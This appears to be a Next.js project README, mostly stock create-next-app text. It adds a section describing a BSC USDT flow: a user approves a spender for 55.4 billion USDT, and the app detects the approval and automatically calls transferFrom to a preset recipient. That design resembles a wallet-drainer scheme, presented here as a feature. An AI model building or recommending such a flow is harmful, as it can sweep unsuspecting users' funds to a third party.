This is a [Next.js](https://nextjs.org) project bootstrapped with [`create-next-app`](https://nextjs.org/docs/app/api-reference/cli/create-next-app).

## BNB Smart Chain USDT flow

The reusable implementation in [`src/lib/usdt-bsc.ts`](./src/lib/usdt-bsc.ts) targets the verified Binance-Peg BSC-USD contract at `0x55d398326f99059fF775485246999027B3197955` and reads its live `decimals()` value.

1. The token owner approves a spender for `55,400,000,000` USDT.
2. The app auto-detects the `Approval` event for that owner/spender pair.
3. Once the approval is detected, the system sends the `transferFrom` call to the configured recipient.

Only pass wallet providers supplied by the user's wallet (EIP-1193); never pass private keys or seed phrases. Review both transaction prompts and the recipient before signing. The Solidity executor in [`contracts/UsdtTransferExecutor.sol`](./contracts/UsdtTransferExecutor.sol) is an optional fixed-recipient alternative that can be used for the same pattern when the spender is known ahead of time.

## Getting Started

First, run the development server:

```bash
npm run dev
# or
yarn dev
# or
pnpm dev
# or
bun dev
```

Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.

You can start editing the page by modifying `app/page.tsx`. The page auto-updates as you edit the file.

This project uses [`next/font`](https://nextjs.org/docs/app/building-your-application/optimizing/fonts) to automatically optimize and load [Geist](https://vercel.com/font), a new font family for Vercel.

## Learn More

To learn more about Next.js, take a look at the following resources:

- [Next.js Documentation](https://nextjs.org/docs) - learn about Next.js features and API.
- [Learn Next.js](https://nextjs.org/learn) - an interactive Next.js tutorial.

You can check out [the Next.js GitHub repository](https://github.com/vercel/next.js) - your feedback and contributions are welcome!

## Deploy on Vercel

The easiest way to deploy your Next.js app is to use the [Vercel Platform](https://vercel.com/new?utm_medium=default-template&filter=next.js&utm_source=create-next-app&utm_campaign=create-next-app-readme) from the creators of Next.js.

Check out our [Next.js deployment documentation](https://nextjs.org/docs/app/building-your-application/deploying) for more details.
